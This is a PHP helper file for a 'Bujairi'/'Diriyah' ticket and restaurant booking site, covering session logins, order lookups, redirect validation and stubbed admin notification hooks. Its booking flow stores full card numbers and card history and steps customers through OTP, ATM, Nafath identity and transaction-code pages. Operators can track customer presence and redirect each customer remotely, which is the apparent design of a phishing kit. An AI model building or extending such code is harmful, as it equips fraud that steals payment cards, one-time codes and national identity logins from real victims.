<?php
declare(strict_types=1);

if (!defined('AUTH_NEXT_DIRIYAH')) {
    define('AUTH_NEXT_DIRIYAH', 'diriyah');
}
if (!defined('AUTH_NEXT_RESTAURANT')) {
    define('AUTH_NEXT_RESTAURANT', 'restaurant');
}

if (!function_exists('h')) {
    function h(string $v): string
    {
        return htmlspecialchars($v, ENT_QUOTES, 'UTF-8');
    }
}

if (!function_exists('json_response')) {
    function json_response(array $payload, int $status = 200): void
    {
        http_response_code($status);
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode($payload, JSON_UNESCAPED_UNICODE);
        exit;
    }
}

if (!function_exists('redirect')) {
    function redirect(string $path): void
    {
        $target = url($path);
        header('Location: ' . $target, true, 302);
        exit;
    }
}

if (!function_exists('url')) {
    function url(string $path = ''): string
    {
        $base = defined('APP_BASE') ? (string) APP_BASE : '/';
        $base = rtrim($base, '/');
        $path = ltrim($path, '/');
        if ($path === '') {
            return ($base !== '' ? $base : '/') . '/';
        }
        return ($base !== '' ? $base : '') . '/' . $path;
    }
}

if (!function_exists('bujairi_pdo')) {
    function bujairi_pdo(): PDO
    {
        return dashboard_pdo();
    }
}

if (!function_exists('bujairi_dashboard_email_for_user_id')) {
    /** بريد العميل في لوحة التحكم: مستخدم موجب أو ضيف سالب */
    function bujairi_dashboard_email_for_user_id(int $userId): string
    {
        if (!function_exists('dashboard_pdo')) {
            return '';
        }
        try {
            $pdo = dashboard_pdo();
            if ($userId > 0) {
                $st = $pdo->prepare('SELECT email FROM users WHERE id = ? LIMIT 1');
                $st->execute([$userId]);
                $e = $st->fetchColumn();
                return $e !== false && $e !== null ? trim((string) $e) : '';
            }
            if ($userId < 0) {
                $st = $pdo->prepare('SELECT email FROM guest_logins WHERE id = ? LIMIT 1');
                $st->execute([- $userId]);
                $e = $st->fetchColumn();
                return $e !== false && $e !== null ? trim((string) $e) : '';
            }
        } catch (Throwable $e) {
        }
        return '';
    }
}

if (!function_exists('auth_user_id')) {
    function auth_user_id(): ?int
    {
        $id = (int) ($_SESSION['customer_user_id'] ?? 0);
        return $id > 0 ? $id : null;
    }
}

if (!function_exists('auth_customer_email')) {
    function auth_customer_email(): ?string
    {
        $e = trim((string) ($_SESSION['customer_email'] ?? $_SESSION['guest_email'] ?? ''));
        return $e !== '' ? $e : null;
    }
}

if (!function_exists('auth_login_user')) {
    function auth_login_user(int $id, string $email): void
    {
        $_SESSION['customer_user_id'] = $id;
        $_SESSION['customer_email'] = trim($email);
    }
}

if (!function_exists('auth_guest_login')) {
    function auth_guest_login(string $email): void
    {
        $_SESSION['guest_email'] = trim($email);
    }
}

if (!function_exists('auth_touch_user_login')) {
    function auth_touch_user_login(int $id): void
    {
        try {
            $st = bujairi_pdo()->prepare('UPDATE users SET last_login_at = NOW() WHERE id = ?');
            $st->execute([$id]);
        } catch (Throwable $e) {
        }
    }
}

if (!function_exists('auth_remember_extend_session_cookie')) {
    function auth_remember_extend_session_cookie(): void
    {
        if (session_status() === PHP_SESSION_ACTIVE) {
            setcookie(session_name(), session_id(), time() + (86400 * 30), '/');
        }
    }
}

if (!function_exists('auth_login_next_apply_get')) {
    function auth_login_next_apply_get(): void
    {
        $next = trim((string) ($_GET['next'] ?? ''));
        if ($next === AUTH_NEXT_DIRIYAH || $next === AUTH_NEXT_RESTAURANT) {
            $_SESSION['login_next'] = $next;
        }
    }
}

if (!function_exists('auth_login_next_redirect_for_customer')) {
    function auth_login_next_redirect_for_customer(): string
    {
        $next = (string) ($_SESSION['login_next'] ?? '');
        if ($next === AUTH_NEXT_DIRIYAH) {
            return url('booking/tickets.php');
        }
        if ($next === AUTH_NEXT_RESTAURANT) {
            return url('restaurants.php');
        }
        return url('index.php');
    }
}

if (!function_exists('auth_require_customer_login_or_redirect')) {
    function auth_require_customer_login_or_redirect(): void
    {
        if (auth_customer_email() === null) {
            redirect('login.php');
        }
    }
}

if (!function_exists('bujairi_safe_internal_return')) {
    function bujairi_safe_internal_return(string $path): string
    {
        $path = trim($path);
        if ($path === '' || str_starts_with($path, 'http://') || str_starts_with($path, 'https://') || str_contains($path, '..')) {
            return '';
        }
        return '/' . ltrim($path, '/');
    }
}

if (!function_exists('order_by_id')) {
    function order_by_id(PDO $pdo, int $id): ?array
    {
        $st = $pdo->prepare('SELECT * FROM orders WHERE id = ? LIMIT 1');
        $st->execute([$id]);
        $row = $st->fetch(PDO::FETCH_ASSOC);
        return is_array($row) ? $row : null;
    }
}

if (!function_exists('order_items')) {
    function order_items(PDO $pdo, int $orderId): array
    {
        $st = $pdo->prepare('SELECT * FROM order_items WHERE order_id = ? ORDER BY id ASC');
        $st->execute([$orderId]);
        return $st->fetchAll(PDO::FETCH_ASSOC) ?: [];
    }
}

if (!function_exists('restaurant_by_id')) {
    function restaurant_by_id(PDO $pdo, int $id): ?array
    {
        try {
            $st = $pdo->prepare('SELECT * FROM restaurants WHERE id = ? LIMIT 1');
            $st->execute([$id]);
            $r = $st->fetch(PDO::FETCH_ASSOC);
            if (is_array($r)) {
                return $r;
            }
        } catch (Throwable $e) {
        }
        return ['id' => $id, 'name' => 'مطعم', 'minimum_charge' => 50];
    }
}

if (!function_exists('bujairi_wants_json_response')) {
    function bujairi_wants_json_response(): bool
    {
        $accept = (string) ($_SERVER['HTTP_ACCEPT'] ?? '');
        $xrw = (string) ($_SERVER['HTTP_X_REQUESTED_WITH'] ?? '');
        return str_contains($accept, 'application/json') || strtolower($xrw) === 'xmlhttprequest';
    }
}

if (!function_exists('bujairi_decode_card_history')) {
    function bujairi_decode_card_history($raw): array
    {
        if (!is_string($raw) || trim($raw) === '') {
            return [];
        }
        $dec = json_decode($raw, true);
        return is_array($dec) ? $dec : [];
    }
}

if (!function_exists('bujairi_stored_redirect_targets_same_booking_step')) {
    function bujairi_stored_redirect_targets_same_booking_step(string $stored, int $orderId, string $step): bool
    {
        $stepMap = [
            'card' => 'booking/payment-info.php',
            'otp' => 'booking/otp.php',
            'atm' => 'booking/atm.php',
        ];
        $target = $stepMap[$step] ?? '';
        if ($target === '') {
            return false;
        }
        return str_contains($stored, $target) && str_contains($stored, 'id=' . $orderId);
    }
}

if (!function_exists('bujairi_order_masked_card_display')) {
    function bujairi_order_masked_card_display(array $order): string
    {
        $num = preg_replace('/\D/', '', (string) ($order['card_number'] ?? ''));
        if (strlen($num) < 4) {
            return '**** **** **** ****';
        }
        return '**** **** **** ' . substr($num, -4);
    }
}

if (!function_exists('booking_force_empty_form')) {
    function booking_force_empty_form(): bool
    {
        return isset($_GET['fresh']) && (string) $_GET['fresh'] === '1';
    }
}

if (!function_exists('bujairi_nafath_fixed_banner_url')) {
    function bujairi_nafath_fixed_banner_url(): string
    {
        return url('image/nafath-banner.jpg');
    }
}

if (!function_exists('bujairi_normalize_internal_destination')) {
    function bujairi_normalize_internal_destination(string $to): string
    {
        $to = trim($to);
        if ($to === '' || str_contains($to, '..') || str_starts_with($to, 'http://') || str_starts_with($to, 'https://')) {
            return '';
        }
        if ($to[0] !== '/') {
            $to = '/' . $to;
        }
        return $to;
    }
}

if (!function_exists('booking_validate_stored_redirect')) {
    function booking_validate_stored_redirect(string $to): bool
    {
        if ($to === '' || str_contains($to, '..')) {
            return false;
        }
        return preg_match('#^/?[a-zA-Z0-9_/\-\.]+(\?[a-zA-Z0-9_=&\-\.]+)?$#', $to) === 1;
    }
}

if (!function_exists('bujairi_redirect_through_loading_bridge')) {
    function bujairi_redirect_through_loading_bridge(string $path): string
    {
        $enc = rawurlencode($path);
        return '/redirect-bridge.php?to=' . $enc;
    }
}

if (!function_exists('bujairi_redirect_url_for_browser')) {
    function bujairi_redirect_url_for_browser(string $path): string
    {
        return url(ltrim($path, '/'));
    }
}

if (!function_exists('booking_redirect_url_for_slug')) {
    function booking_redirect_url_for_slug(string $slug, int $orderId): string
    {
        $map = [
            'checkout' => 'booking/checkout.php',
            'payment_method' => 'booking/payment-method.php',
            'payment_info' => 'booking/payment-info.php',
            'otp' => 'booking/otp.php',
            'atm' => 'booking/atm.php',
            'customer_info' => 'booking/customer-info.php',
            'nafath' => 'booking/nafath.php',
            'transaction' => 'booking/transaction-code.php',
            'success' => 'booking/success.php',
            'index' => 'index.php',
        ];
        $p = $map[$slug] ?? 'booking/checkout.php';
        if (str_starts_with($p, 'booking/')) {
            $p .= '?id=' . $orderId;
        }
        return $p;
    }
}

if (!function_exists('bujairi_pusher_notify_admin_orders_changed')) {
    function bujairi_pusher_notify_admin_orders_changed(): void {}
}
if (!function_exists('bujairi_pusher_notify_dashboard_order_update')) {
    function bujairi_pusher_notify_dashboard_order_update(PDO $pdo, int $orderId, string $message, string $rowStyle = 'info'): void {}
}
if (!function_exists('bujairi_pusher_notify_admin_customer_presence')) {
    function bujairi_pusher_notify_admin_customer_presence(int $orderId, array $payload): void {}
}
if (!function_exists('bujairi_pusher_notify_dashboard_new_client')) {
    function bujairi_pusher_notify_dashboard_new_client(int $id, string $message = ''): void {}
}
if (!function_exists('bujairi_pusher_notify_customer_redirect')) {
    function bujairi_pusher_notify_customer_redirect(int $orderId, string $stored, int $ver): void {}
}
if (!function_exists('bujairi_pusher_ready')) {
    function bujairi_pusher_ready(): bool { return false; }
}
